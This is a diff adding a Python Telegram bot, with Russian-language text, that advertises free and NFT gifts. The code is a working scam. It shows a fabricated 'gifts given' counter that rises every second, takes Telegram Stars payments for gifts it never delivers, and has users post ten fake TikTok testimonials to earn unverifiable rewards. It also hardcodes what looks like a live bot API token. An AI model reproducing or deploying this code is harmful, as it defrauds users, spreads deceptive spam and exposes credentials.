@@ -1,0 +1,277 @@
+import telebot
+from telebot import types
+import time
+import sqlite3
+
+# Данные для подключения
+API_TOKEN = '8708256332:AAFOMWD5QtdsjtS-LCL9PL23mnM0neOrg4k'
+ADMIN_ID = 7379255867
+
+bot = telebot.TeleBot(API_TOKEN)
+
+# --- РАБОТА С БАЗОЙ ДАННЫХ ---
+def init_db():
+    conn = sqlite3.connect('bot_data.db')
+    cursor = conn.cursor()
+    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
+                      (uid INTEGER PRIMARY KEY, name TEXT, stars INTEGER DEFAULT 0, step TEXT DEFAULT 'main')''')
+    cursor.execute('''CREATE TABLE IF NOT EXISTS submissions 
+                      (uid INTEGER PRIMARY KEY, photos TEXT)''')
+    conn.commit()
+    conn.close()
+
+def db_get_user(uid, name="User"):
+    conn = sqlite3.connect('bot_data.db')
+    cursor = conn.cursor()
+    cursor.execute("SELECT stars, step FROM users WHERE uid = ?", (uid,))
+    res = cursor.fetchone()
+    if not res:
+        cursor.execute("INSERT INTO users (uid, name, stars, step) VALUES (?, ?, ?, ?)", (uid, name, 0, 'main'))
+        conn.commit()
+        res = (0, 'main')
+    conn.close()
+    return {'stars': res[0], 'step': res[1]}
+
+def db_update_stars(uid, amount):
+    conn = sqlite3.connect('bot_data.db')
+    cursor = conn.cursor()
+    cursor.execute("UPDATE users SET stars = stars + ? WHERE uid = ?", (amount, uid))
+    conn.commit()
+    conn.close()
+
+def db_update_step(uid, step):
+    conn = sqlite3.connect('bot_data.db')
+    cursor = conn.cursor()
+    cursor.execute("UPDATE users SET step = ? WHERE uid = ?", (step, uid))
+    conn.commit()
+    conn.close()
+
+def db_save_submission(uid, photos_list):
+    conn = sqlite3.connect('bot_data.db')
+    cursor = conn.cursor()
+    photos_str = ",".join(photos_list)
+    cursor.execute("INSERT OR REPLACE INTO submissions (uid, photos) VALUES (?, ?)", (uid, photos_str))
+    conn.commit()
+    conn.close()
+
+# --- СЧЕТЧИК ПОДАРКОВ ---
+START_COUNT = 152415
+START_TIME = int(time.time())
+
+def get_current_gifts():
+    seconds_passed = int(time.time()) - START_TIME
+    total = START_COUNT + seconds_passed
+    return f"{total:,}".replace(",", " ")
+
+# Данные о подарках
+GIFTS = {
+    "🎭 Маска": "https://ibb.co/hx6dgvj6", "💼 Рюкзак": "https://ibb.co/SX64sfWh", "📅 Календарь": "https://ibb.co/9mNGyLsk",
+    "🍭 Лолипоп": "https://ibb.co/3YpBsrgT", "🦩 Фламинго": "https://ibb.co/DPgbPFtV", "🥥 Кокос": "https://ibb.co/LdB5r5ty",
+    "🥚 Яйцо": "https://ibb.co/HLjCQzqM", "🍦 Мороженое": "https://ibb.co/vB00C0y", "💩 Какашка": "https://ibb.co/Rp35KTpp",
+    "🧁 Кекс": "https://ibb.co/nN6DF5HL", "🍀 Клевер": "https://ibb.co/20kG7Gpc", "🫙 Банка": "https://ibb.co/CNCGH6t",
+    "🐍 Змея": "https://ibb.co/bMgXKh4m", "🍸 Коктейль": "https://ibb.co/xSx5TG33", "🕯 Свеча": "https://ibb.co/wZ4yPSD2",
+    "🐒 Обезьяна": "https://ibb.co/tMjcdPGw", "🍄 Гриб": "https://ibb.co/1tCmj7zH", "🌸 Цветок": "https://ibb.co/yP3T8z3",
+    "🎃 Тыква": "https://ibb.co/DfDWW87L", "👁 Глаз": "https://ibb.co/xqHhPsNp", "🧹 Метла": "https://ibb.co/4wrZmkwb",
+    "🍜 Рамен": "https://ibb.co/mCQ1BrNV", "🗽 Свобода": "https://ibb.co/yFPjnGPg", "🧦 Носок": "https://ibb.co/JR8xGJyZ",
+    "🐶 Редо": "https://ibb.co/6dyp5hz", "👜 Сетка": "https://ibb.co/tpDNL70Q", "⌚ Часы": "https://ibb.co/6RcbmsFv",
+    "🚬 Сигара": "https://ibb.co/WvsnSYDk", "⛑ Шлем": "https://ibb.co/N2dMtGMH", "🧢 Кепка": "https://ibb.co/cKw8L5F0",
+    "🍑 Персик": "https://ibb.co/BKGb64tK", "🐸 Лягушка": "https://ibb.co/0y65bHb2", "👳 Папаха": "https://ibb.co/Df4W9W0F",
+    "🗿 Статуя Дурова": "https://ibb.co/DgmxvyB3", "💪 Бицепс": "https://ibb.co/WW2G5bjZ", "🤵 Оскар": "https://ibb.co/pBqQLDGq",
+    "🧴 Духи": "https://ibb.co/Xk4985Zk", "📦 UFC": "https://ibb.co/DHz0p9fQ"
+}
+
+photo_buffer = {}
+
+def send_main_menu(chat_id, stars):
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    kb.add(types.InlineKeyboardButton("🎁 Подарки", callback_data="gifts_list"),
+           types.InlineKeyboardButton("👤 Профиль", callback_data="profile"),
+           types.InlineKeyboardButton("⭐ Задание", callback_data="tasks"),
+           types.InlineKeyboardButton("🎁 Бесплатные подарки", callback_data="free_gifts_cat"))
+    
+    text = (f"🧸 Главное меню\n\n🎁 Подарено подарков: {get_current_gifts()}\n\n"
+            "В данном боте вы можете получить бесплатно подарки обычные и NFT.\n\n"
+            "Для получения звезд выполняйте задания. За задания вы можете получить NFT подарки, а также звезды.\n\n"
+            "Выберите категорию👇")
+    bot.send_message(chat_id, text, reply_markup=kb)
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    uid = call.from_user.id
+    user = db_get_user(uid)
+
+    if call.data == "main_menu":
+        try: bot.delete_message(call.message.chat.id, call.message.message_id)
+        except: pass
+        send_main_menu(call.message.chat.id, user['stars'])
+
+    elif call.data == "free_gifts_cat":
+        kb = types.InlineKeyboardMarkup(row_width=1)
+        items = [("🧸Мишка – 5⭐", "bear_5"), ("💝Сердце – 5⭐", "heart_5"), ("🎁Подарок – 10⭐", "giftbox_10"),
+                 ("🌹Роза – 10⭐", "rose_10"), ("🚀Ракета – 25⭐", "rocket_25"), ("💐Букет – 25⭐", "bouquet_25"),
+                 ("💍Кольцо – 50⭐", "ring_50"), ("🏆Кубок – 50⭐", "cup_50")]
+        for btn_text, code in items:
+            kb.add(types.InlineKeyboardButton(btn_text, callback_data=f"starsbuy_{code}"))
+        kb.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="main_menu"))
+        
+        text = "В данном разделе Вы можете приобрести подарки по дешевому также данные подарки вы можете обменять на звезды выдача подарка моментально"
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=kb)
+
+    elif call.data.startswith("starsbuy_"):
+        data = call.data.split('_')
+        item_code, price_val = data[1], int(data[2])
+        names = {"bear": "Мишка🧸", "heart": "Сердце💝", "giftbox": "Подарок🎁", "rose": "Роза🌹", "rocket": "Ракета🚀", "bouquet": "Букет💐", "ring": "Кольцо💍", "cup": "Кубок🏆"}
+        item_name = names.get(item_code, "Подарок")
+        prices = [types.LabeledPrice(label=item_name, amount=price_val)]
+        bot.send_invoice(call.message.chat.id, title=item_name, description=f"Подарок {item_name} за {price_val} звезд",
+                         invoice_payload=f"pay_{item_code}", provider_token="", currency="XTR", prices=prices)
+
+    elif call.data == "gifts_list":
+        kb = types.InlineKeyboardMarkup(row_width=1)
+        for name in GIFTS.keys():
+            kb.add(types.InlineKeyboardButton(f"{name} — 35 ⭐", callback_data=f"buy_{name[:15]}"))
+        kb.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="main_menu"))
+        try: bot.delete_message(call.message.chat.id, call.message.message_id)
+        except: pass
+        bot.send_message(call.message.chat.id, "✨ НФТ подарки:", reply_markup=kb)
+
+    elif call.data.startswith("buy_"):
+        prefix = call.data.replace("buy_", "")
+        gift_full_name = next((name for name in GIFTS.keys() if name.startswith(prefix)), "Подарок")
+        img_url = GIFTS.get(gift_full_name, "")
+        kb = types.InlineKeyboardMarkup(row_width=1)
+        kb.add(types.InlineKeyboardButton("Перейти к покупке ↗️", url=f"https://t.me/Glft_free_nft?text={gift_full_name}"),
+               types.InlineKeyboardButton("Оплатить со звезд ⭐", callback_data=f"pay_bal_{prefix}"),
+               types.InlineKeyboardButton("⬅️ Назад", callback_data="gifts_list"))
+        
+        caption = (f"🎁 {gift_full_name}\n\n1️⃣ Нажмите кнопку ниже.\n2️⃣ Оплатите платное сообщение.\n"
+                   "3️⃣ После оплаты бот автоматически выдаст Вам подарок.\n\n"
+                   "⚡ Скриншоты не нужны — подтверждение срабатывает автоматически.")
+        try: bot.delete_message(call.message.chat.id, call.message.message_id)
+        except: pass
+        bot.send_photo(call.message.chat.id, img_url, caption=caption, reply_markup=kb)
+
+    elif call.data.startswith("pay_bal_"):
+        prefix = call.data.replace("pay_bal_", "")
+        gift_full_name = next((name for name in GIFTS.keys() if name.startswith(prefix)), "Подарок")
+        if user['stars'] >= 35:
+            db_update_stars(uid, -35)
+            bot.answer_callback_query(call.id, f"✅ Куплено: {gift_full_name}!", show_alert=True)
+            bot.send_message(call.message.chat.id, f"🎊 Вы успешно приобрели {gift_full_name} за 35 ⭐ с баланса!")
+        else:
+            bot.answer_callback_query(call.id, "❌ Недостаточно звезд на балансе!", show_alert=True)
+
+    elif call.data == "profile":
+        kb = types.InlineKeyboardMarkup()
+        kb.add(types.InlineKeyboardButton("Назад ⬅️", callback_data="main_menu"))
+        text = (f"📊 Ваш профиль!\n\n┌ 💡 ID: `{uid}`\n├ 👤 Имя: {call.from_user.first_name}\n"
+                f"├ ⭐ Баланс: {user['stars']}\n└ ⭐ Потрачено звёзд: 0")
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)
+
+    elif call.data == "tasks":
+        kb = types.InlineKeyboardMarkup(row_width=1)
+        kb.add(types.InlineKeyboardButton("✅ Я выполнил", callback_data="task_done"),
+               types.InlineKeyboardButton("⬅️ Назад", callback_data="main_menu"))
+        task_text = (
+            "📱 Задание: Комментарии в TikTok\n\n🎁 Награда: +50 ⭐\n\n📝 Что нужно сделать:\n\n"
+            "   1️⃣ Откройте TikTok\n"
+            "   2️⃣ Найдите любое видео в ленте\n"
+            "   3️⃣ Напишите ровно 10 комментариев под разными видео с этим текстом:\n\n"
+            "      `durov_play_bot реально дарит подарки, проверено` \n"
+            "(можно нажать скопируется)\n\n"
+            "   4️⃣ Поставьте ❤️ лайк под каждым комментарием\n"
+            "   5️⃣ Сделайте 10 скриншотов (комментарий + лайк)\n"
+            "   6️⃣ Отправьте все 10 фото сюда подряд\n\n"
+            "⏳ После проверки звёзды придут в течение 24 часов\n\n"
+            "`durov_play_bot реально дарит подарки, проверено`"
+        )
+        bot.edit_message_text(task_text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)
+
+    elif call.data == "task_done":
+        db_update_step(uid, 'wait_photos')
+        photo_buffer[uid] = []
+        bot.send_message(call.message.chat.id, "📸 Теперь отправь 10 скриншотов (фото) твоих комментариев по одному.")
+
+@bot.pre_checkout_query_handler(func=lambda query: True)
+def pre_checkout(pre_checkout_query):
+    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
+
+@bot.message_handler(content_types=['successful_payment'])
+def got_payment(message):
+    bot.send_message(message.chat.id, "✅ Оплата Telegram Stars прошла успешно! Подарок будет выдан моментально.")
+
+@bot.message_handler(commands=['start'])
+def start_cmd(message):
+    user = db_get_user(message.from_user.id, message.from_user.first_name)
+    send_main_menu(message.chat.id, user['stars'])
+
+@bot.message_handler(content_types=['photo', 'text'])
+def handle_all(message):
+    uid = message.from_user.id
+    user = db_get_user(uid)
+    
+    # --- АДМИН КОМАНДЫ ---
+    if uid == ADMIN_ID and message.text:
+        # 1. Просмотр списка всех заявок
+        if message.text == "проверка":
+            conn = sqlite3.connect('bot_data.db')
+            cursor = conn.cursor()
+            cursor.execute("SELECT uid FROM submissions")
+            subs = cursor.fetchall()
+            conn.close()
+            if not subs: 
+                bot.send_message(ADMIN_ID, "Нет активных заявок.")
+                return
+            bot.send_message(ADMIN_ID, "📝 Список заявок (ID пользователей):\n\n" + "\n".join([f"`{s[0]}`" for s in subs]), parse_mode="Markdown")
+            return
+
+        # 2. Одобрение заявки (одобрено ID)
+        if message.text.startswith("одобрено "):
+            try:
+                target_id = int(message.text.split()[1])
+                db_update_stars(target_id, 50)
+                conn = sqlite3.connect('bot_data.db')
+                conn.cursor().execute("DELETE FROM submissions WHERE uid = ?", (target_id,))
+                conn.commit()
+                conn.close()
+                bot.send_message(target_id, "✅ Ваша заявка одобрена! Вы получили на баланс 50 ⭐ звезд.")
+                bot.send_message(ADMIN_ID, f"✅ Заявка {target_id} одобрена, звезды выданы.")
+            except Exception as e:
+                bot.send_message(ADMIN_ID, f"❌ Ошибка: проверьте формат (одобрено 1234567)")
+            return
+
+        # 3. Просмотр фото конкретной заявки (просто ID)
+        if message.text.isdigit():
+            conn = sqlite3.connect('bot_data.db')
+            cursor = conn.cursor()
+            cursor.execute("SELECT photos FROM submissions WHERE uid = ?", (int(message.text),))
+            res = cursor.fetchone()
+            conn.close()
+            if res:
+                bot.send_message(ADMIN_ID, f"📸 Фото пользователя {message.text}:")
+                for p in res[0].split(','): 
+                    bot.send_photo(ADMIN_ID, p)
+            else:
+                bot.send_message(ADMIN_ID, "❌ Заявка с таким ID не найдена.")
+            return
+
+    # --- ЛОГИКА ПОЛЬЗОВАТЕЛЯ ---
+    if user['step'] == 'wait_photos':
+        if message.content_type != 'photo':
+            bot.send_message(message.chat.id, "⚠️ Скидывайте только скриншоты (фото)!")
+            return
+        if uid not in photo_buffer: photo_buffer[uid] = []
+        photo_buffer[uid].append(message.photo[-1].file_id)
+        rem = 10 - len(photo_buffer[uid])
+        if rem > 0:
+            bot.send_message(message.chat.id, f"✅ Принято! Осталось еще {rem} скринов до проверки.")
+        else:
+            db_save_submission(uid, photo_buffer[uid])
+            db_update_step(uid, 'main')
+            bot.send_message(message.chat.id, "⌛ Ожидайте проверки модерации. После принятия Вы сразу же получите на баланс 50 ⭐ звезд.")
+            bot.send_message(ADMIN_ID, f"🔔 Новая заявка на проверку! ID: `{uid}`\nНапиши его ID, чтобы увидеть фото, или `одобрено {uid}`, чтобы выдать звезды.", parse_mode="Markdown")
+
+if __name__ == '__main__':
+    init_db()
+    bot.polling(none_stop=True)
+    
